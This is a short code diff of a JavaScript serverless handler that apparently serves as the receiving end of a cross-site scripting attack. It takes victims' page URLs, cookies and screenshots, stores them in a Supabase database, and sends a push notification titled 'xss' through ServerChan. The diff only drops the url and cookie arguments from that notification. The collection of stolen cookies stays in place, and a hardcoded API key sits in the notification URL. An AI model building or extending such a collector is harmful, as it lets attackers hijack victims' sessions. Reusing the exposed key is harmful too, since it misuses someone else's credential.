@@ -26,7 +26,7 @@ export default async function handler(req, res) {
       });
 
       // ==== 异步发送邮件通知（不阻塞主流程）====
-      sendEmailNotification(url, cookie).catch((mailError) => {
+      sendEmailNotification().catch((mailError) => {
         console.error('邮件发送失败（异步）:', mailError);
       });
 
@@ -59,7 +59,7 @@ async function insertToSupabaseAsync(url, cookie, screenshot, trigger_time) {
 }
 
 // ===== 异步发送邮件函数 =====
-async function sendEmailNotification(url, cookie) {
+async function sendEmailNotification() {
 
   const response = await fetch('https://sctapi.ftqq.com/SCT264973TwyxLsp1rLVuTjZ3jHX2DFGJi.send?title=xss', {
     method: 'GET'
